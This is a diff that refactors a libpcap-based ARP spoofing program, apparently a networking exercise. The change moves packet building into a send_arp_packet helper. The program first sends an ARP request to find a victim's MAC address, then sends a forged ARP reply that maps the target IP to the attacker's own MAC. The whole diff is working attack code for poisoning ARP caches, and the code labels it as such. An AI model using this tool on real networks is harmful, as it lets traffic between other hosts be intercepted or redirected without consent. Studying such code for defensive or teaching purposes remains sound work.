@@ -17,6 +17,7 @@ struct Eth_ARP {
 void usage();
 void get_my_mac_addr(const char *dev, char *uc_Mac);
 void get_my_ipv4_addr(const char *dev, char *uc_IP);
+int send_arp_packet(pcap_t* handle, MacAddr dst_mac, MacAddr src_mac, uint16_t op, MacAddr sender_hw, IPv4Addr sender_pr, MacAddr target_hw, IPv4Addr target_pr);
 
 
 int main(int argc, char* argv[]) {
@@ -47,33 +48,28 @@ int main(int argc, char* argv[]) {
 	
 	//// set normal ARP request packet
 	//// (MUST SET NETWORK BYTE ORDER)
-	Eth_ARP packet;
 	char my_mac[18] = "";
 	char my_ip[16] = "";
-	// get attacker's(my) address
+	
+	// get attacker's (my) address
 	get_my_mac_addr(dev, my_mac);
 	get_my_ipv4_addr(dev, my_ip);
 	
-	// eth settings
-	packet.eth.dst_mac_addr.set_mac_addr("ff:ff:ff:ff:ff:ff");
-	packet.eth.src_mac_addr.set_mac_addr(my_mac);
-	packet.eth.eth_type = htons(ETH_TYPE_ARP);
+	// send normal ARP request packet
+	int res = send_arp_packet(
+		handle,
+		MacAddr("ff:ff:ff:ff:ff:ff"),
+		MacAddr(my_mac),
+		ARP_OP_REQUEST,
+		MacAddr(my_mac),
+		IPv4Addr(my_ip),
+		MacAddr("00:00:00:00:00:00"),
+		sender_ip
+	);
 	
-	// arp settings
-	packet.arp.htype = htons(ARP_HTYPE_ETH);
-	packet.arp.ptype = htons(ARP_PTYPE_IPv4);
-	packet.arp.hlen = MAC_ADDR_SIZE;
-	packet.arp.plen = IPv4_ADDR_SIZE;
-	packet.arp.op = htons(ARP_OP_REQUEST);
-	packet.arp.sender_hw_addr.set_mac_addr(my_mac);
-	packet.arp.sender_pr_addr.set_ipv4_addr(my_ip);
-	packet.arp.target_hw_addr.set_mac_addr("00:00:00:00:00:00");
-	packet.arp.target_pr_addr.ip = sender_ip.ip;
-
-	//// send normal ARP request packet to check sender MAC address
-	int res = pcap_sendpacket(handle, (const u_char *)&packet, sizeof(Eth_ARP));
+	// check error
 	if (res != 0) {
-		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+		return -1;
 	} else {
 		printf("Sent ARP request packet to the sender. \nGetting ARP reply packet... ");
 	}
@@ -133,31 +129,26 @@ int main(int argc, char* argv[]) {
 		}
 	}
 	
-	//// Send ARP spoofing packet
-	// eth settings
-	packet.eth.dst_mac_addr.set_mac_addr(sender_mac);
-	packet.eth.src_mac_addr.set_mac_addr(my_mac);
-	packet.eth.eth_type = htons(ETH_TYPE_ARP);
-	
-	// arp settings
-	packet.arp.htype = htons(ARP_HTYPE_ETH);
-	packet.arp.ptype = htons(ARP_PTYPE_IPv4);
-	packet.arp.hlen = MAC_ADDR_SIZE;
-	packet.arp.plen = IPv4_ADDR_SIZE;
-	packet.arp.op = htons(ARP_OP_REPLY);
-	packet.arp.sender_hw_addr.set_mac_addr(my_mac);
-	packet.arp.sender_pr_addr.set_ipv4_addr(target_ip);
-	packet.arp.target_hw_addr.set_mac_addr(sender_mac);
-	packet.arp.target_pr_addr.ip = sender_ip.ip;
-
 	//// send ARP spoofing packet to sender
-	res = pcap_sendpacket(handle, (const u_char *)&packet, sizeof(Eth_ARP));
+	res = send_arp_packet(
+		handle,
+		sender_mac,
+		MacAddr(my_mac),
+		ARP_OP_REPLY,
+		MacAddr(my_mac),
+		target_ip,
+		sender_mac,
+		sender_ip
+	);
+	
+	// check error
 	if (res != 0) {
-		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+		return -1;
 	} else {
 		printf("Sent ARP spoofing packet to the sender.\n");
 	}
 
+	//// close pcap
 	pcap_close(handle);
 }
 
@@ -218,4 +209,35 @@ void get_my_ipv4_addr(const char *dev, char *uc_IP) {
 		(ip & 0x0000FF00) >> 8,
 		(ip & 0x000000FF)
 	);
+}
+
+int send_arp_packet(pcap_t* handle, MacAddr dst_mac, MacAddr src_mac, uint16_t op, MacAddr sender_hw, IPv4Addr sender_pr, MacAddr target_hw, IPv4Addr target_pr) {
+
+	/* Send ARP Packet */
+	Eth_ARP packet;
+	
+	// eth settings
+	packet.eth.dst_mac_addr.set_mac_addr(dst_mac);
+	packet.eth.src_mac_addr.set_mac_addr(src_mac);
+	packet.eth.eth_type = htons(ETH_TYPE_ARP);
+	
+	// arp settings
+	packet.arp.htype = htons(ARP_HTYPE_ETH);
+	packet.arp.ptype = htons(ARP_PTYPE_IPv4);
+	packet.arp.hlen = MAC_ADDR_SIZE;
+	packet.arp.plen = IPv4_ADDR_SIZE;
+	packet.arp.op = htons(op);
+	packet.arp.sender_hw_addr.set_mac_addr(sender_hw);
+	packet.arp.sender_pr_addr.set_ipv4_addr(sender_pr);
+	packet.arp.target_hw_addr.set_mac_addr(target_hw);
+	packet.arp.target_pr_addr.set_ipv4_addr(target_pr);
+
+	//// send normal ARP request packet to check sender MAC address
+	int res = pcap_sendpacket(handle, (const u_char *)&packet, sizeof(Eth_ARP));
+	if (res != 0) {
+		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+		return -1;
+	}
+	
+	return 0;
 }
